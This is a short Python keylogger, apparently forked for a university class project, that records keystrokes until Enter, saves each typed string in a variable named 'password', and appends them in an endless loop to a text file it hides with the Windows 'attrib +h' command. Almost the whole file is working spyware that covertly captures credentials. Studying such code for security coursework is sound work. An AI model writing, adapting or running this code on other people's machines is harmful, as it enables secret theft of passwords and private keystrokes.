#   Original code provided by https://github.com/BrickSigma/Basic-Keylogger
#   
#-  Used by Robert Connor Smith and Jaxon Bladow in our University of North Alabama ITE-449 Class Project
#   as a sample, simple keylogger
#   
#-  I, RCS, assumed I would need to make changes for it to be compatible with my device. Didnt have to. Forked in order
#   to add some os integration and a readme.md separate from the original. Many thanks to Brick Sigma for the entirety of the code. 

# Importing the keyboard module which will acess the inputs from the keyboard
import keyboard

#- Import OS in order to mark file as hidden after the path is created and put in variable form
import os


# Defining the text file name and path
path = "data.txt"

#- Creating the above file, then adding the hidden attribute
file = open(path, 'w')
file = os.popen(f'attrib +h "{path}"', 'w')

#- We then close this because I dont want it to clash with the pre-existing, working code created by Brick Sigma
file.close();

while True:
    with open(path, 'a') as data_file:
        
        # All key presses are recorded as a list into "events" and the record loop stops when the "enter" key is pressed
        events = keyboard.record('enter')
        password = list(keyboard.get_typed_strings(events))
        
        data_file.write('\n') # New line written before data is written
        data_file.write(password[0])
